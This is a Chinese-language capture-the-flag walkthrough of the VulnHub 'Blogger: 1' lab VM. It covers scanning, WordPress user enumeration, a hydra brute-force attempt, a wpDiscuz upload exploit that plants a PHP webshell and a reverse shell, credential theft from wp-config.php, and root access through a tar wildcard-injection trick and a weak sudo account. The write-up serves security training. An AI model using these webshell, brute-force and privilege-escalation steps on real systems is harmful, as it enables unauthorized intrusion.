# blogger: 1

2024-5-25 https://www.vulnhub.com/entry/blogger-1,675/

difficulty: Beginner, Easy

## IP

192.168.5.30

## Scan

先关闭串口设备，否则不能启动。

先将 192.168.5.30 blogger.thm 添加到 /etc/hosts 文件。

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 951d828f5ede9a00a80739bdacadd344 (RSA)
|   256 d7b452a2c8fab70ed1a8d070cd6b3690 (ECDSA)
|_  256 dff24f773344d593d77917455aa1368b (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Blogger | Home
```

80 端口是 web 服务，首页上没发现什么信息，源代码中也没什么提示，使用 gobuster 进行扫描：

```
gobuster -t 64 dir -u http://blogger.thm/ -k -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x php,txt,html -e

http://blogger.thm/images               (Status: 301) [Size: 311] [--> http://blogger.thm/images/]
http://blogger.thm/assets               (Status: 301) [Size: 311] [--> http://blogger.thm/assets/]
http://blogger.thm/css                  (Status: 301) [Size: 308] [--> http://blogger.thm/css/]
http://blogger.thm/index.html           (Status: 200) [Size: 46199]
http://blogger.thm/js                   (Status: 301) [Size: 307] [--> http://blogger.thm/js/]
```

首页上的 LOGIN 按钮也是假的，点击后没有像后台发送数据。

http://blogger.thm/assets/fonts/blog/ 中，发现了一个 wordpress 的网站。

突破口应该是这个 wordpress，使用 wpscan 进行扫描，枚举用户：

```
wpscan --url http://blogger.thm/assets/fonts/blog/ -e u
```

得到用户 j@m3s 和 jm3s ， 进行密码爆破：

```
hydra -t 20 -L user -P ~/tools/dict/rockyou.txt blogger.thm -f http-post-form "/assets/fonts/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblogger.thm%2Fwordpress%2Fwp-admin%2F&testcookie=1:F=is incorrect"
```

没有成功。

在观察网站中的内容，可以进行留言，并且网站的主题是 WordPress Theme: Poseidon by ThemeZee.看看这个主题有没有漏洞，没有找到。

看到留言板中有图片上传功能，这里能不能上传我们的 webshell，进行尝试。枚举后，发现 wp 的插件 wpdiscuz，这个插件存在漏洞。

```
wpscan --url http://blogger.thm/assets/fonts/blog/ --plugins-detection mixed
```

对应的 exp 为 https://www.exploit-db.com/exploits/49967，对应的执行利用代码为：

```
python 49967.py -u http://blogger.thm/assets/fonts/blog/ -p '?p=9'

exp内容为 <?php system($_GET['cmd']); ?>
```

在上传测试时，在 webshell 文件头中添加 GIF89a 就能把 php 文件上传，在 kali 上监听 8888 端口，访问下面网址，就得到了反弹的链接：

```
curl http://blogger.thm/assets/fonts/blog/wp-content/uploads/2024/05/8888-1716609170.2277.php
```

目标系统中有 python3，先升级下 tty。

寻找 wp-config.php 文件，里面有数据库配置信息：

```
www-data@ubuntu-xenial:/var/www/wordpress/assets/fonts/blog$ cat wp-config.php

define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'sup3r_s3cr3t');
define('DB_HOST', 'localhost');
```

登陆数据库，发现了用户名和密码：

```
j@m3s | $P$BqG2S/yf1TNEu03lHunJLawBEzKQZv/
```

经过尝试，没有找到对应的明文密码。

在 /home 目录中发现了 3 个用户，james ubuntu vagrant，看看这个密码能不能切换到这几个用户上，尝试后，都不成功。

suid 没有特权程序，crontab 中有一个自定义的计划任务：

```
PATH=/home/james:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * * root /usr/local/bin/backup.sh
```

```
www-data@ubuntu-xenial:/tmp$ cat /usr/local/bin/backup.sh
#!/bin/sh
cd /home/james/
tar czf /tmp/backup.tar.gz *
```

解压 /tmp/backup.tar.gz 发现了 user flag:

```
cd /tmp
tar -xvf backup.tar.gz

www-data@ubuntu-xenial:/tmp$ cat user.txt
ZmxhZ3tZMHVfRCFEXzE3IDopfQ==    --> flag{Y0u_D!D_17 :)}
```

linpes 发现文件 /opt/.creds，内容好像是多重变换编码过的：

```
';u22>'v$)='2a#B&>`c'=+C(?5(|)q**bAv2=+E5s'+|u&I'vDI(uAt&=+(|`yx')Av#>'v%?}:#=+)';y@%'5(2vA!'<y$&u"H!"ll
```

经过 google 搜索，找到 james 的密码：

```
https://gchq.github.io/CyberChef/#recipe=ROT47(47)From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=Jzt1MjI%2BJ3YkKT0nMmEjQiY%2BYGMnPStDKD81KHwpcSoqYkF2Mj0rRTVzJyt8dSZJJ3ZESSh1QXQmPSsofGB5eCcpQXYjPid2JT99OiM9KyknO3lAJSc1KDJ2QSEnPHkkJnUiSCEibGw
```

```
james:S3cr37_P@$$W0rd
```

这里设计的不好，感觉没必要。

切换到 james 用户，tar 用户可以以 root 身份打包执行，可以进行利用得到 root 权限：

```
cd /home/james
printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" >> --checkpoint=1
```

等待一分钟，/bin/bash 就有了 suid 权限，便可提升到 root：

```
/bin/bash -p

bash-4.3# cat root.txt
SGV5IFRoZXJlLApNeXNlbGYgR2F1cmF2IFJhaiwgSGFja2VyLCBQcm9ncmFtbWVyICYgRnJlZUxhbmNlci4KVGhpcyBpcyBteSBmaXJzdCBhdHRlbXB0IHRvIGNyZWF0ZSBhIHJvb20uIExldCBtZSBrbm93IGlmIHlvdSBsaWtlZCBpdC4KQW55IGlzc3VlIG9yIHN1Z2dlc3Rpb25zIGZvciBtZS4gUGluZyBtZSBhdCB0d2l0dGVyCgpUd2l0dGVyOiBAdGhlaGFja2Vyc2JyYWluCkdpdGh1YjogQHRoZWhhY2tlcnNicmFpbgpJbnN0YWdyYW06IEB0aGVoYWNrZXJzYnJhaW4KQmxvZzogaHR0cHM6Ly90aGVoYWNrZXJzYnJhaW4ucHl0aG9uYW55d2hlcmUuY29tCgoKSGVyZSdzIFlvdXIgRmxhZy4KZmxhZ3tXMzExX0QwbjNfWTB1X1AzbjN0cjR0M2RfTTMgOil9Cg==
```

```
Hey There,
Myself Gaurav Raj, Hacker, Programmer & FreeLancer.
This is my first attempt to create a room. Let me know if you liked it.
Any issue or suggestions for me. Ping me at twitter

Twitter: @thehackersbrain
Github: @thehackersbrain
Instagram: @thehackersbrain
Blog: https://thehackersbrain.pythonanywhere.com

Here's Your Flag.
flag{W311_D0n3_Y0u_P3n3tr4t3d_M3 :)}
```

另外一种提权到 root,发现 vagrant 用户的密码为弱密码，也为 vagrant，切换到该用户后，sudo -l 发现可以执行全部程序：

```
(ALL) NOPASSWD: ALL
```

```
bash-4.3$ sudo su
root@ubuntu-xenial:~# id
uid=0(root) gid=0(root) groups=0(root)
```
